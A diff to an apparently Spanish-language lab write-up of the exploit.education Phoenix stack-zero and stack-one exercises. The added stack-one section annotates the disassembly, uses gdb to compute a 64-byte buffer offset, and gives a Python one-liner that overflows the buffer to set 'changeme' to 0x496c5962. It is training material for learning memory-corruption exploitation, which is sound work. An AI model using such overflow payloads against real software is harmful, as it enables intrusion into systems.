@@ -72,17 +72,40 @@ $1 = 64
 Buffer de 64 bits
 
 ```console
-[user@phoenix-amd64:/opt/phoenix/amd64]:$  python -c "print 'A'* 64" | ./stack-zero 
+[user@phoenix]:$   python -c "print 'A'* 64" | ./stack-zero 
 Welcome to phoenix/stack-zero, brought to you by https://exploit.education
 Uh oh, 'changeme' has not yet been changed. Would you like to try again?
-[user@phoenix-amd64:/opt/phoenix/amd64]:$ python -c "print 'A'* 70" | ./stack-zero 
+[user@phoenix]:$ python -c "print 'A'* 70" | ./stack-zero 
 Welcome to phoenix/stack-zero, brought to you by https://exploit.education
 Well done, the 'changeme' variable has been changed!
 ```
 
 -----------------------------------------------------------------------------------------
 
+## Stack - One
+```
+   mov edi,0x400750 ;call 0x4004c0 <puts@plt>
+            puts("Welcome to phoenix/stack-one, brought to you by https://exploit.education")
 
+   mov esi,0x4007a0; call  0x4004d0 <errx@plt>
+            puts("specify an argument, to be copied into the \"buffer\"")
 
+   lea rax,[rbp-0x50]; mov rdi,rax; call   0x4004a0 <strcpy@plt>
+            char buffer (0x50);
+            strcpy(buffer, input);   <- [rbp-0x50] 0x7fffffffe460:
 
+   mov eax,DWORD PTR [rbp-0x10]; cmp eax,0x496c5962; jne 0x4006d7 <main+106>
+            if buffer !=  0x496c5962: <- [rbp-0x10] 0x7fffffffe4a0
+        
+   mov edi,0x4007d8; call 0x4004c0 <puts@plt>
+            puts("Well done, you have successfully set changeme to the correct value")
+                 
+   mov edi,0x400820; call   0x4004b0 <printf@plt>
+            puts("Getting closer! changeme is currently \"\", we want 0x496c5962\n")
+            
+        (gdb) p/d 0x7fffffffe4a0 - 0x7fffffffe460 -> 64
+
+[user@phoenix]:$ ./stack-one $(python -c "print 'A'* 64 + '\x62\x59\x6c\x49'") 
+        Well done, you have successfully set changeme to the correct value
+```
 
